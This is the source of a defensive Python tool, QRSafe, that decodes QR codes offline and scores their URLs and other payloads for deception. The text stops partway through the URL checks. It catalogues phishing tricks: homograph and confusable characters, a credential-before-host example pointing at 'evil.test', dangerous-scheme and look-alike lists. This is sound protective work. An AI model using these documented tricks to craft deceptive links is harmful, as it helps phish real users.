#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
================================================================================
 QRSAFE
 QR Code URL Safety Checker - CLI + Web App
--------------------------------------------------------------------------------
 Author  : Karanam Shrivasta
 GitHub  : https://github.com/mrshrivasta
 LinkedIn: https://www.linkedin.com/in/karanam-shrivasta/
 Version : 1.0.0
--------------------------------------------------------------------------------
 WHAT THIS DOES
   Reads a QR code - from an image, or from text you paste - and tells you what
   is actually inside it before you let a phone act on it. A QR code is opaque
   to a human by design: you cannot look at one and know where it goes. That gap
   is the whole attack.

   It decodes the payload, works out what KIND of thing it is (a URL, a Wi-Fi
   network, a payment string, a contact card, an SMS, a phone number), and then
   examines it for the specific tricks used to make a hostile destination look
   trustworthy:

     - Unicode homograph domains: аpple.com with a Cyrillic 'a' is not apple.com
     - Punycode that hides what it decodes to
     - Credentials in the URL: https://apple.com@evil.test/ goes to evil.test
     - Look-alike and typosquatted domains
     - IP addresses in place of a hostname, including decimal and hex forms
     - URL shorteners, which hide the real destination entirely
     - Percent-encoding and other obfuscation of the host
     - Dangerous schemes: javascript:, data:, file:, intent:
     - Wi-Fi payloads that would silently join a network
     - Payment and phone payloads, which cost money rather than data

 *** IT NEVER OPENS, FETCHES OR FOLLOWS ANYTHING. ***
   This is the central safety decision in the tool and it is deliberate. Fetching
   a suspicious URL to "see where it goes" would:
     - tell the operator that you are looking, and from which address
     - trigger single-use payloads and burn the evidence
     - fetch content this tool has no business fetching
   So it analyses the URL as a STRING. Every check is offline. There is no
   network access, no reputation service and no API key anywhere in this tool.

 WHAT IT IS NOT
   It is NOT a malware scanner and it has NO list of known-bad sites. A URL that
   scores clean here has merely survived a set of structural checks - the domain
   could still have been registered five minutes ago to host a phishing page,
   and nothing in a URL string can tell you that. Treat a clean result as "no
   obvious trick", never as "safe".

 LEGAL AND SAFETY
   Analysis only. If a code looks hostile, do not visit it to confirm. Report it,
   and if it is a physical sticker over a legitimate code - which is the common
   real-world attack on parking meters, restaurant menus and payment terminals -
   tell whoever owns the surface. Provided "as is" with no warranty; the author
   accepts no liability for any loss or damage.
================================================================================
"""

from __future__ import annotations

import argparse
import base64
import binascii
import csv
import html as _html
import io
import ipaddress
import json
import math
import os
import platform
import re
import shutil
import sqlite3
import sys
import textwrap
import unicodedata
import urllib.parse
from datetime import datetime, timezone

APP_NAME = "QRSafe"
APP_SHORT = "QRSAFE"
VERSION = "1.0.0"
AUTHOR = "Karanam Shrivasta"
GITHUB = "https://github.com/mrshrivasta"
LINKEDIN = "https://www.linkedin.com/in/karanam-shrivasta/"
DEFAULT_DB = os.environ.get("QRSAFE_DB", "qrsafe.db")

NEVER_FETCHES = (
    "This tool NEVER opens, fetches or follows anything it decodes. Every check is done on "
    "the URL as a string, offline. Fetching a suspicious link to see where it goes tells the "
    "operator you are looking, can trigger a single-use payload, and is itself a risk."
)
DISCLAIMER_SHORT = (
    "Offline analysis only - nothing is ever fetched or opened. NOT a malware scanner and "
    "there is no list of known-bad sites: a clean result means 'no obvious trick', never "
    "'safe'."
)
DISCLAIMER_LONG = textwrap.dedent(
    """\
    THIS TOOL NEVER OPENS, FETCHES OR FOLLOWS ANYTHING. It decodes a QR code and examines
    the result as text. There is no network access, no reputation service and no API key.
    That is deliberate: fetching a suspicious URL to find out where it leads tells the
    operator that you are looking and from which address, can trigger a payload that only
    fires once, and pulls content onto your machine that you did not want.

    IT IS NOT A MALWARE SCANNER. There is no database of known-bad domains, and there
    cannot be one offline. What it finds is STRUCTURAL deception - the tricks used to make
    a hostile destination look like a trustworthy one. A URL that scores clean has survived
    those checks and nothing more. The domain could have been registered minutes ago to
    host a phishing page, and no amount of looking at the string would reveal it. Treat a
    clean result as "no obvious trick", never as "safe".

    If a code looks hostile, do not visit it to confirm. If it is a sticker placed over a
    legitimate code - the common attack on parking meters, menus and payment terminals -
    tell whoever owns that surface.

    Provided "as is" with no warranty; the author accepts no liability for any loss or
    damage arising from reliance on this analysis."""
)

SEVERITIES = ["critical", "high", "medium", "low", "info"]
SEV_WEIGHT = {"critical": 45.0, "high": 22.0, "medium": 9.0, "low": 3.0, "info": 0.0}
SEV_COLOR = {"critical": "#e5484d", "high": "#f76808", "medium": "#ffb224",
             "low": "#3e9dd8", "info": "#8b8f9b"}

RISK_BANDS = [(70, "do not use this code", "#e5484d"),
              (40, "strong signs of deception", "#f76808"),
              (18, "check before using", "#ffb224"),
              (6, "minor points to note", "#3e9dd8"),
              (0, "no obvious trick found", "#30a46c")]


def risk_band(score: float) -> tuple[str, str]:
    for cut, label, colour in RISK_BANDS:
        if score >= cut:
            return label, colour
    return "no obvious trick found", "#30a46c"


# =============================================================================
# SECTION 1 - Utilities
# =============================================================================

def now_iso() -> str:
    return datetime.now(timezone.utc).replace(microsecond=0).isoformat()


def ts_pretty(iso: str | None) -> str:
    if not iso:
        return "-"
    try:
        return datetime.fromisoformat(iso).strftime("%Y-%m-%d %H:%M:%S")
    except Exception:
        return iso


def clamp(v, lo, hi):
    return max(lo, min(hi, v))


def html_escape(s) -> str:
    return _html.escape("" if s is None else str(s), quote=True)


def fmt_bytes(n, precision: int = 1) -> str:
    if n is None:
        return "-"
    n = float(n)
    for unit in ("B", "KiB", "MiB", "GiB"):
        if n < 1024 or unit == "GiB":
            return f"{n:.{0 if unit == 'B' else precision}f} {unit}"
        n /= 1024.0
    return f"{n:.{precision}f} GiB"


def F(category, title, severity, description, evidence="", advice=""):
    """One finding. 'advice' says what to DO, which is the point of the tool."""
    return {"category": category, "title": title, "severity": severity,
            "description": description, "evidence": str(evidence)[:1500], "advice": advice}


def visible(s: str, limit: int = 200) -> str:
    """Render a string so hidden characters cannot lie about what it contains.

    This matters more here than almost anywhere: the entire homograph attack is
    invisible characters and look-alike glyphs, so anything echoed back to the
    user must be unambiguous.
    """
    out = []
    for ch in s[:limit]:
        cat = unicodedata.category(ch)
        if ch in "\t\n\r":
            out.append({"\t": "\\t", "\n": "\\n", "\r": "\\r"}[ch])
        elif cat in ("Cf", "Cc", "Co", "Cs") or ch in "\u200b\u200c\u200d\ufeff":
            out.append(f"\\u{ord(ch):04x}")
        elif ord(ch) > 127:
            try:
                name = unicodedata.name(ch)
            except ValueError:
                name = f"U+{ord(ch):04X}"
            out.append(f"[{ch}={name}]")
        else:
            out.append(ch)
    return "".join(out) + ("..." if len(s) > limit else "")


# =============================================================================
# SECTION 2 - Reading QR codes
#   Decoding is done with OpenCV when it is available. If it is not, the tool
#   says so rather than pretending it read nothing - a QR code that fails to
#   decode and a QR code containing nothing are completely different things.
# =============================================================================

try:
    import cv2
    import numpy as np
    HAVE_CV2 = True
except Exception:  # pragma: no cover
    cv2 = None
    np = None
    HAVE_CV2 = False


class DecodeResult:
    def __init__(self):
        self.payloads: list[str] = []
        self.status = "ok"          # ok | none-found | unavailable | error
        self.detail = ""
        self.source = ""
        self.count = 0
        self.corners: list = []

    def as_dict(self):
        return {"payloads": self.payloads, "status": self.status, "detail": self.detail,
                "source": self.source, "count": self.count}


def decoder_available() -> tuple[bool, str]:
    if HAVE_CV2:
        return True, f"OpenCV {cv2.__version__}"
    return False, ("no QR decoder is installed. Install opencv-python to read images; "
                   "you can still analyse a payload you paste in as text.")


def decode_image(path: str) -> DecodeResult:
    """Read every QR code in an image file."""
    r = DecodeResult()
    r.source = path
    ok, why = decoder_available()
    if not ok:
        return _fail(r, "unavailable", why)
    if not os.path.exists(path):
        return _fail(r, "error", f"{path}: no such file")
    try:
        img = cv2.imread(path)
    except Exception as e:
        return _fail(r, "error", f"{path}: {e}")
    if img is None:
        return _fail(r, "error",
                     f"{path}: could not be read as an image. Supported formats depend on "
                     f"the OpenCV build; PNG and JPEG are always available.")
    det = cv2.QRCodeDetector()
    payloads: list[str] = []
    try:
        found, datas, pts, _ = det.detectAndDecodeMulti(img)
        if found and datas:
            payloads = [d for d in datas if d]
            r.corners = pts.tolist() if pts is not None else []
    except cv2.error:
        found = False
    if not payloads:
        try:
            data, pts, _ = det.detectAndDecode(img)
            if data:
                payloads = [data]
                r.corners = pts.tolist() if pts is not None else []
        except cv2.error as e:
            return _fail(r, "error", f"decoder error: {e}")
    if not payloads:
        # A detected-but-unreadable code is worth distinguishing from no code.
        try:
            found_any, _pts = det.detect(img)
        except cv2.error:
            found_any = False
        if found_any:
            return _fail(r, "none-found",
                         "a QR code was located in the image but could not be decoded. It "
                         "may be damaged, blurred, or partly covered - which is itself worth "
                         "noting if this code is in a public place.")
        return _fail(r, "none-found",
                     "no QR code was found in this image. Try a sharper or less cropped "
                     "picture; nothing is being hidden from you, the decoder simply found "
                     "nothing.")
    r.payloads = payloads
    r.count = len(payloads)
    if len(payloads) > 1:
        r.detail = (f"{len(payloads)} separate QR codes were found in this one image. Each "
                    f"is analysed separately below.")
    return r


def _fail(r: DecodeResult, status: str, detail: str) -> DecodeResult:
    r.status, r.detail = status, detail
    return r


def encode_qr(payload: str, path: str, scale: int = 8) -> tuple[bool, str]:
    """Write a QR code image. Used for the built-in examples and the self test."""
    if not HAVE_CV2:
        return False, "OpenCV is not installed, so images cannot be generated"
    try:
        enc = cv2.QRCodeEncoder_create()
        img = enc.encode(payload)
        big = cv2.resize(img, (img.shape[1] * scale, img.shape[0] * scale),
                         interpolation=cv2.INTER_NEAREST)
        border = scale * 4
        framed = cv2.copyMakeBorder(big, border, border, border, border,
                                    cv2.BORDER_CONSTANT, value=255)
        cv2.imwrite(path, framed)
        return True, path
    except Exception as e:
        return False, str(e)


# =============================================================================
# SECTION 3 - What kind of thing is in the code?
#   A QR code is not always a URL, and the non-URL kinds carry their own risks -
#   a Wi-Fi payload can put a phone on an attacker's network without a single
#   tap, and a payment payload moves money.
# =============================================================================

PAYLOAD_KINDS = {
    "url": ("Web address", "Opens a page in a browser."),
    "wifi": ("Wi-Fi network", "Offers to JOIN a wireless network. One tap and the phone is "
                              "on someone else's network, where all unencrypted traffic is "
                              "visible to them."),
    "tel": ("Phone number", "Offers to CALL a number. Premium-rate numbers cost money the "
                            "moment the call connects."),
    "sms": ("Text message", "Pre-fills a text message, sometimes with the body already "
                            "written. Premium shortcodes charge on send."),
    "mailto": ("Email", "Opens a pre-filled email."),
    "vcard": ("Contact card", "Offers to add a contact. Harmless in itself, but a way to "
                              "plant a convincing fake number in a phonebook."),
    "geo": ("Map location", "Opens a location in a maps application."),
    "calendar": ("Calendar event", "Adds an event, which can carry a link and a reminder."),
    "payment": ("Payment", "Starts a PAYMENT. Money, not data - check the recipient and the "
                           "amount before confirming anything."),
    "otp": ("Authenticator setup", "Adds a two-factor secret to an authenticator app."),
    "intent": ("Android intent", "Asks Android to open a specific application, and can pass "
                                 "data straight to it."),
    "app": ("App or deep link", "Opens a specific application rather than a web page."),
    "text": ("Plain text", "Just text - no action is taken by scanning it."),
    "unknown": ("Unrecognised", "The payload did not match any format this tool knows."),
}

DANGEROUS_SCHEMES = {
    "javascript": ("critical", "javascript: runs code in whatever page is open. In a QR "
                               "code it has no legitimate use whatsoever."),
    "data": ("high", "data: carries the whole content inside the URL itself, so a complete "
                     "web page - including a login form - can be delivered with no server "
                     "and no domain to check."),
    "file": ("high", "file: refers to the local filesystem of whatever opens it."),
    "vbscript": ("critical", "vbscript: runs code. It has no legitimate use in a QR code."),
    "blob": ("medium", "blob: refers to data held by the browser itself."),
    "jar": ("high", "jar: can load and run Java archives."),
    "smb": ("high", "smb: opens a Windows file share, which can leak credentials to whoever "
                    "runs the server."),
}
SAFE_SCHEMES = {"https", "http", "mailto", "tel", "sms", "smsto", "geo", "bitcoin",
                "upi", "matmsg", "otpauth", "market", "intent"}

SHORTENERS = {
    "bit.ly", "tinyurl.com", "t.co", "goo.gl", "ow.ly", "is.gd", "buff.ly", "adf.ly",
    "bit.do", "cutt.ly", "rebrand.ly", "shorte.st", "rb.gy", "tiny.cc", "lnkd.in",
    "trib.al", "shorturl.at", "s.id", "v.gd", "qr.ae", "t.ly", "short.io", "bl.ink",
    "snip.ly", "clck.ru", "u.to", "soo.gd", "1url.com", "linktr.ee",
}

# Brands that are impersonated most often. Used only for LOOK-ALIKE comparison -
# there is no claim that any domain in this list is or is not legitimate.
COMMON_TARGETS = [
    "google.com", "apple.com", "microsoft.com", "amazon.com", "paypal.com", "facebook.com",
    "instagram.com", "whatsapp.com", "netflix.com", "linkedin.com", "dropbox.com",
    "github.com", "outlook.com", "office.com", "icloud.com", "gmail.com", "chase.com",
    "hsbc.com", "barclays.co.uk", "sbi.co.in", "hdfcbank.com", "icicibank.com",
    "paytm.com", "phonepe.com", "binance.com", "coinbase.com", "steampowered.com",
    "dhl.com", "fedex.com", "ups.com", "usps.com", "royalmail.com", "indiapost.gov.in",
]

# Top-level domains that are cheap or free and appear disproportionately in abuse
# reporting. Presence is a weak signal, and the wording says so.
CHEAP_TLDS = {"tk", "ml", "ga", "cf", "gq", "top", "xyz", "work", "click", "link", "loan",
              "download", "review", "country", "kim", "science", "party", "gdn", "racing",
              "win", "bid", "stream", "date", "faith", "cricket", "accountant", "zip",
              "mov", "rest", "cyou", "sbs", "quest"}

# Two-part public suffixes. Without these, 'sbi.co.in' looks like the subdomain
# 'sbi' under the domain 'co.in', and every co.uk / com.au / gov.in domain in the
# world is falsely accused of impersonation. This is a curated subset of the
# Public Suffix List covering the common cases - it is not exhaustive, and the
# tool says so rather than implying it knows every suffix.
MULTI_TLDS = {
    "co.uk", "org.uk", "ac.uk", "gov.uk", "net.uk", "me.uk", "ltd.uk", "plc.uk",
    "co.in", "net.in", "org.in", "gov.in", "ac.in", "edu.in", "res.in", "nic.in",
    "com.au", "net.au", "org.au", "edu.au", "gov.au", "co.nz", "net.nz", "org.nz",
    "co.za", "org.za", "com.br", "net.br", "org.br", "gov.br", "com.cn", "net.cn",
    "org.cn", "gov.cn", "edu.cn", "co.jp", "or.jp", "ne.jp", "ac.jp", "go.jp",
    "co.kr", "or.kr", "com.mx", "com.ar", "com.sg", "com.my", "com.hk", "com.tw",
    "com.tr", "com.pk", "com.bd", "com.ph", "com.vn", "co.id", "or.id", "com.eg",
    "com.sa", "com.ng", "co.ke", "com.gh", "co.il", "com.ua", "com.pl", "com.ru",
}

# Legitimate domains that contain another brand's name. Without these, the
# "a brand name appears inside a longer name" check accuses Microsoft's own
# login domain of impersonating Microsoft. Curated and deliberately short - it
# is a false-positive guard, not a claim to know every legitimate domain.
KNOWN_RELATED = {
    "microsoftonline.com", "office365.com", "googleapis.com", "googleusercontent.com",
    "gstatic.com", "googlevideo.com", "appleid.apple.com", "icloud.com",
    "amazonaws.com", "amazoncognito.com", "paypalobjects.com", "facebookmail.com",
    "fbcdn.net", "githubusercontent.com", "githubassets.com", "live.com",
    "windows.net", "azurewebsites.net", "sharepoint.com", "outlook.office.com",
    "linkedin.cn", "licdn.com", "netfliximg.com", "nflxvideo.net",
}

SENSITIVE_WORDS = {"login", "signin", "verify", "verification", "account", "secure",
                   "security", "update", "confirm", "password", "passwd", "credential",
                   "bank", "banking", "wallet", "payment", "invoice", "billing", "refund",
                   "unlock", "suspended", "recover", "reset", "auth", "authorize", "otp",
                   "kyc", "aadhaar", "pan", "netbanking"}


def classify_payload(payload: str) -> dict:
    """Work out what a QR payload actually is."""
    text = (payload or "").strip()
    lower = text.lower()
    out = {"kind": "unknown", "raw": text, "scheme": None, "fields": {}}
    if not text:
        out["kind"] = "text"
        return out
    if lower.startswith("wifi:"):
        out["kind"] = "wifi"
        out["fields"] = _parse_semicolon(text[5:])
        return out
    if lower.startswith(("begin:vcard", "mecard:")):
        out["kind"] = "vcard"
        out["fields"] = _parse_semicolon(text.split(":", 1)[1]) if lower.startswith(
            "mecard:") else {}
        return out
    if lower.startswith("begin:vevent"):
        out["kind"] = "calendar"
        return out
    if lower.startswith("otpauth://"):
        out["kind"] = "otp"
        out["scheme"] = "otpauth"
        return out
    if lower.startswith(("upi://", "bitcoin:", "ethereum:", "litecoin:", "bitcoincash:")):
        out["kind"] = "payment"
        out["scheme"] = lower.split(":", 1)[0].rstrip("/")
        if lower.startswith("upi://"):
            try:
                out["fields"] = dict(urllib.parse.parse_qsl(
                    urllib.parse.urlsplit(text).query))
            except ValueError:
                pass
        return out
    if lower.startswith("intent:"):
        out["kind"] = "intent"
        out["scheme"] = "intent"
        return out
    if lower.startswith(("smsto:", "sms:")):
        out["kind"] = "sms"
        out["scheme"] = lower.split(":", 1)[0]
        return out
    if lower.startswith("tel:"):
        out["kind"] = "tel"
        out["scheme"] = "tel"
        return out
    if lower.startswith("mailto:"):
        out["kind"] = "mailto"
        out["scheme"] = "mailto"
        return out
    if lower.startswith("geo:"):
        out["kind"] = "geo"
        out["scheme"] = "geo"
        return out
    m = re.match(r"^([a-zA-Z][a-zA-Z0-9+.\-]{0,30}):", text)
    if m:
        scheme = m.group(1).lower()
        out["scheme"] = scheme
        out["kind"] = "url" if scheme in ("http", "https") else (
            "url" if scheme in DANGEROUS_SCHEMES else "app")
        if scheme in DANGEROUS_SCHEMES:
            out["kind"] = "url"
        return out
    if re.match(r"^[\w.\-]+\.[a-zA-Z]{2,}(?:[/?#]|$)", text):
        out["kind"] = "url"
        out["scheme"] = None      # no scheme given; a scanner will usually add http://
        out["schemeless"] = True
        return out
    out["kind"] = "text"
    return out


def _parse_semicolon(body: str) -> dict:
    """Parse the KEY:value;KEY:value; format used by WIFI: and MECARD:."""
    out: dict[str, str] = {}
    field = ""
    escaped = False
    for ch in body:
        if escaped:
            field += ch
            escaped = False
            continue
        if ch == "\\":
            escaped = True
            continue
        if ch == ";":
            if ":" in field:
                k, _, v = field.partition(":")
                out[k.strip().upper()] = v
            field = ""
            continue
        field += ch
    if ":" in field:
        k, _, v = field.partition(":")
        out[k.strip().upper()] = v
    return out


# =============================================================================
# SECTION 4 - URL dissection
#   The host is the only part of a URL that decides where you actually go, and
#   almost every trick in this file is a way of making the host LOOK like
#   something it is not. So the host is extracted carefully and by hand, rather
#   than trusting a parser that may be more forgiving than a browser.
# =============================================================================

# Characters that are visually confusable with ASCII. This is a working subset of
# the Unicode confusables data, covering the ones actually used in attacks.
CONFUSABLES = {
    "а": "a", "е": "e", "о": "o", "р": "p", "с": "c", "у": "y", "х": "x", "ѕ": "s",
    "і": "i", "ј": "j", "ԁ": "d", "ɡ": "g", "һ": "h", "ӏ": "l", "ν": "v", "ᴡ": "w",
    "α": "a", "ο": "o", "ρ": "p", "ϲ": "c", "ѵ": "v", "ｅ": "e", "ｏ": "o", "ⅰ": "i",
    "ｌ": "l", "𝐚": "a", "𝗮": "a", "ⅼ": "l", "ɑ": "a", "ɓ": "b", "ϳ": "j", "ɵ": "o",
    "ʏ": "y", "ʙ": "b", "ɴ": "n", "ʀ": "r", "ᴏ": "o", "ᴄ": "c", "ᴘ": "p", "0": "o",
    "1": "l", "ⅿ": "m", "ｒ": "r", "ｎ": "n",
}
# Digits and letters that people mistake for each other in a plain ASCII domain.
ASCII_LOOKALIKE = {"0": "o", "1": "l", "5": "s", "3": "e", "rn": "m", "vv": "w",
                   "l": "i", "cl": "d"}

SCRIPT_RANGES = [
    ("Latin", 0x0041, 0x024F), ("Greek", 0x0370, 0x03FF), ("Cyrillic", 0x0400, 0x04FF),
    ("Armenian", 0x0530, 0x058F), ("Hebrew", 0x0590, 0x05FF), ("Arabic", 0x0600, 0x06FF),
    ("Devanagari", 0x0900, 0x097F), ("Bengali", 0x0980, 0x09FF), ("Thai", 0x0E00, 0x0E7F),
    ("Han", 0x4E00, 0x9FFF), ("Hiragana", 0x3040, 0x309F), ("Katakana", 0x30A0, 0x30FF),
    ("Hangul", 0xAC00, 0xD7AF), ("Fullwidth", 0xFF00, 0xFFEF),
]


def script_of(ch: str) -> str:
    cp = ord(ch)
    if ch.isascii():
        return "ASCII"
    for name, lo, hi in SCRIPT_RANGES:
        if lo <= cp <= hi:
            return name
    return "Other"


def dissect_url(text: str) -> dict:
    """Pull a URL apart into the pieces that decide where it goes."""
    out = {"raw": text, "scheme": None, "userinfo": None, "host": None, "port": None,
           "path": "", "query": "", "fragment": "", "error": None, "schemeless": False,
           "host_decoded": None, "host_is_ip": False, "ip_form": None,
           "registrable": None, "tld": None, "labels": [], "public_suffix": None}
    work = text.strip()
    m = re.match(r"^([a-zA-Z][a-zA-Z0-9+.\-]{0,30}):", work)
    if m:
        out["scheme"] = m.group(1).lower()
        rest = work[len(m.group(0)):]
    else:
        out["schemeless"] = True
        out["scheme"] = None
        rest = work
    if rest.startswith("//"):
        rest = rest[2:]
    elif out["scheme"] in (None, "http", "https"):
        pass
    else:
        out["path"] = rest
        return out

    # The authority ends at the FIRST of / ? # - browsers agree on this, and
    # getting it wrong is how a parser can be fooled into naming the wrong host.
    cut = len(rest)
    for ch in "/?#":
        i = rest.find(ch)
        if i >= 0:
            cut = min(cut, i)
    authority, remainder = rest[:cut], rest[cut:]

    # Everything before the LAST '@' is credentials, not the host. This is the
    # single most effective URL trick there is.
    if "@" in authority:
        out["userinfo"], _, authority = authority.rpartition("@")
    host = authority
    if host.startswith("["):
        end = host.find("]")
        if end > 0:
            out["host"] = host[:end + 1]
            after = host[end + 1:]
            if after.startswith(":"):
                out["port"] = after[1:]
        else:
            out["error"] = "unterminated IPv6 literal in the host"
            out["host"] = host
    elif ":" in host:
        h, _, p = host.rpartition(":")
        out["host"], out["port"] = h, p
    else:
        out["host"] = host

    frag = remainder.find("#")
    if frag >= 0:
        out["fragment"] = remainder[frag + 1:]
        remainder = remainder[:frag]
    qm = remainder.find("?")
    if qm >= 0:
        out["query"] = remainder[qm + 1:]
        remainder = remainder[:qm]
    out["path"] = remainder

    host = out["host"] or ""
    # Percent-encoding in a hostname is not normal and is used to hide it.
    if "%" in host:
        try:
            decoded = urllib.parse.unquote(host)
            if decoded != host:
                out["host_decoded"] = decoded
                host = decoded
                out["host"] = decoded
        except Exception:
            pass
    out["ip_form"], out["host_is_ip"] = _ip_form(host)
    if not out["host_is_ip"] and host:
        labels = host.rstrip(".").split(".")
        out["labels"] = labels
        out["tld"] = labels[-1].lower() if len(labels) > 1 else None
        # the registrable domain is one label MORE than the public suffix, so
        # sbi.co.in is the domain and 'sbi' is not a subdomain of 'co.in'
        suffix_len = 1
        if len(labels) >= 2 and ".".join(labels[-2:]).lower() in MULTI_TLDS:
            suffix_len = 2
            out["public_suffix"] = ".".join(labels[-2:]).lower()
        else:
            out["public_suffix"] = labels[-1].lower() if len(labels) > 1 else None
        take = suffix_len + 1
        out["registrable"] = ".".join(labels[-take:]).lower() if len(labels) >= take \
            else host.lower()
    return out


def _ip_form(host: str) -> tuple[str | None, bool]:
    """Detect an address written as a hostname, including the unusual forms.

    A browser will happily accept http://2130706433/ and go to 127.0.0.1. Most
    people would not recognise that as an address at all.
    """
    if not host:
        return None, False
    h = host.strip("[]")
    try:
        ipaddress.ip_address(h)
        return ("IPv6 literal" if ":" in h else "IPv4 dotted"), True
    except ValueError:
        pass
    if re.fullmatch(r"\d+", h):
        try:
            v = int(h)
            if 0 <= v <= 0xFFFFFFFF:
                return f"decimal ({ipaddress.ip_address(v)})", True
        except ValueError:
            pass
    if re.fullmatch(r"0[xX][0-9a-fA-F]+", h):
        try:
            v = int(h, 16)
            if 0 <= v <= 0xFFFFFFFF:
                return f"hexadecimal ({ipaddress.ip_address(v)})", True
        except ValueError:
            pass
    if re.fullmatch(r"0[0-7]+(\.0[0-7]+){0,3}", h):
        return "octal", True
    if re.fullmatch(r"(?:0[xX][0-9a-fA-F]+\.){1,3}0[xX][0-9a-fA-F]+", h):
        return "dotted hexadecimal", True
    return None, False


def punycode_decode(host: str) -> tuple[str | None, str | None]:
    """Turn xn-- labels back into the characters they represent."""
    if not host or "xn--" not in host.lower():
        return None, None
    try:
        decoded = ".".join(
            lab.encode("ascii").decode("idna") if lab.lower().startswith("xn--") else lab
            for lab in host.split("."))
        return decoded, None
    except (UnicodeError, UnicodeDecodeError) as e:
        return None, f"the punycode in this host is malformed: {e}"


def skeleton(text: str) -> str:
    """Map a string to its ASCII look-alike form, for comparison."""
    out = []
    for ch in unicodedata.normalize("NFKC", text.lower()):
        out.append(CONFUSABLES.get(ch, ch))
    return "".join(out)


def edit_distance(a: str, b: str, cap: int = 4) -> int:
    if abs(len(a) - len(b)) > cap:
        return cap + 1
    prev = list(range(len(b) + 1))
    for i, ca in enumerate(a, 1):
        cur = [i]
        for j, cb in enumerate(b, 1):
            cur.append(min(prev[j] + 1, cur[j - 1] + 1, prev[j - 1] + (ca != cb)))
        prev = cur
        if min(prev) > cap:
            return cap + 1
    return prev[-1]


def looks_like_target(registrable: str) -> list[dict]:
    """Compare a domain against commonly impersonated ones.

    Deliberately conservative: an exact match is never reported, and only close
    misses count, because 'looks a bit like' would fire on half the internet.
    """
    if not registrable:
        return []
    hits = []
    skel = skeleton(registrable)
    base = registrable.split(".")[0]
    skel_base = skeleton(base)
    for target in COMMON_TARGETS:
        if registrable == target:
            return []                      # it IS the domain; nothing to say
        tbase = target.split(".")[0]
        if skel == skeleton(target):
            hits.append({"target": target, "why": "identical once look-alike characters are "
                                                  "folded to their ASCII equivalents",
                         "distance": 0, "strength": "critical"})
            continue
        if skel_base == skeleton(tbase) and base != tbase:
            hits.append({"target": target, "why": "the name matches once look-alike "
                                                  "characters are folded, only the suffix "
                                                  "differs",
                         "distance": 0, "strength": "high"})
            continue
        d = edit_distance(skel_base, skeleton(tbase), cap=2)
        if 0 < d <= (1 if len(tbase) <= 6 else 2):
            hits.append({"target": target, "why": f"{d} character(s) different from the "
                                                  f"real name",
                         "distance": d, "strength": "high"})
            continue
        if tbase in base and base != tbase and len(base) > len(tbase):
            if registrable in KNOWN_RELATED:
                continue
            # a weak signal on its own: microsoftonline.com and secure-paypal.tk
            # both contain a brand, and only one is a problem
            hits.append({"target": target,
                         "why": f"the real name '{tbase}' appears inside this longer one. "
                                f"On its own this means little - plenty of legitimate "
                                f"domains do it - but it is how a domain is made to read "
                                f"convincingly",
                         "distance": len(base) - len(tbase), "strength": "low"})
    if registrable in KNOWN_RELATED:
        hits = [h for h in hits if h["strength"] in ("critical", "high")]
    hits.sort(key=lambda h: (SEVERITIES.index(h["strength"]) if h["strength"] in SEVERITIES
                             else 9, h["distance"]))
    return hits[:4]


# =============================================================================
# SECTION 5 - The checks
# =============================================================================

def analyse_url(text: str) -> tuple[list[dict], dict]:
    """Every structural check, on the URL as a string. Nothing is fetched."""
    findings: list[dict] = []
    d = dissect_url(text)
    host = d["host"] or ""

    if d["error"]:
        findings.append(F("Structure", "The URL is malformed", "medium",
                          d["error"], visible(text),
                          "A malformed URL may be parsed differently by different "
                          "applications, which is itself a way to hide a destination."))

    # ---- scheme ----
    scheme = d["scheme"]
    if scheme in DANGEROUS_SCHEMES:
        sev, why = DANGEROUS_SCHEMES[scheme]
        findings.append(F("Scheme", f"Dangerous scheme: {scheme}:", sev, why,
                          visible(text[:160]),
                          "Do not open this. There is no ordinary reason for a QR code to "
                          "carry this scheme."))
        if scheme == "data":
            findings.extend(_check_data_url(text))
        return findings, d
    if d["schemeless"]:
        findings.append(F("Scheme", "No scheme is given", "low",
                          "The payload has no http:// or https://, so the scanner will "
                          "guess - and most guess http://, which is unencrypted.",
                          visible(text[:120]),
                          "Prefer codes that state https:// explicitly."))
    elif scheme == "http":
        findings.append(F("Scheme", "Plain http, not https", "medium",
                          "The connection is not encrypted, so anything typed into the page "
                          "- and the page itself - can be read or altered in transit.",
                          f"scheme: {scheme}",
                          "Never enter a password or payment detail on a page reached over "
                          "plain http."))

    # ---- credentials in the URL ----
    if d["userinfo"] is not None:
        findings.append(F("Deception", "The URL contains credentials before the host",
                          "critical",
                          "Everything before the '@' is a username, not the destination. "
                          "The browser goes to what comes AFTER it. This is the most "
                          "effective URL trick there is, because the eye stops reading at "
                          "the familiar name.",
                          f"looks like: {visible(d['userinfo'])}@...\n"
                          f"actually goes to: {visible(host)}",
                          f"The real destination is {host}. Judge the link on that alone."))

    # ---- the host as an address ----
    if d["host_is_ip"]:
        sev = "high" if d["ip_form"] not in ("IPv4 dotted", "IPv6 literal") else "medium"
        findings.append(F("Host", f"The host is an IP address ({d['ip_form']})", sev,
                          "There is no domain name here, so there is nothing to recognise "
                          "and no certificate that can name an owner."
                          + (" It is written in a form most people would not recognise as "
                             "an address at all." if sev == "high" else ""),
                          f"host: {visible(host)}",
                          "Legitimate organisations put a name here. Treat a bare address "
                          "in a public QR code as a strong warning sign."))
        try:
            ip = ipaddress.ip_address(host.strip("[]"))
            if ip.is_private or ip.is_loopback:
                findings.append(F("Host", "The address is a private or loopback address",
                                  "medium",
                                  "This address is not reachable from the internet; it "
                                  "points somewhere on the local network.",
                                  f"{host}",
                                  "In a public QR code this usually means the code was made "
                                  "for a device on a specific network - or is trying to "
                                  "reach one on yours."))
        except ValueError:
            pass

    # ---- percent-encoded host ----
    if d["host_decoded"]:
        findings.append(F("Deception", "The hostname was percent-encoded", "high",
                          "Encoding characters in a hostname serves no purpose except to "
                          "make it unreadable at a glance.",
                          f"written as: {visible(text[:120])}\n"
                          f"decodes to: {visible(d['host_decoded'])}",
                          "Judge the decoded host, not the written one."))

    # ---- punycode and mixed scripts ----
    if host and not d["host_is_ip"]:
        findings.extend(_check_host_characters(host, d))

    # ---- look-alike domains ----
    if d["registrable"] and not d["host_is_ip"]:
        decoded_host = punycode_decode(host)[0] or host
        reg_for_compare = d["registrable"]
        decoded_reg = ".".join(decoded_host.rstrip(".").split(".")[-2:]).lower() \
            if decoded_host.count(".") >= 1 else decoded_host.lower()
        for candidate in {reg_for_compare, decoded_reg}:
            for hit in looks_like_target(candidate):
                sev = hit["strength"]
                findings.append(F("Deception",
                                  f"This domain resembles {hit['target']}", sev,
                                  hit["why"] + ". A domain that merely resembles a brand has "
                                               "nothing to do with that brand.",
                                  f"this code: {visible(candidate)}\n"
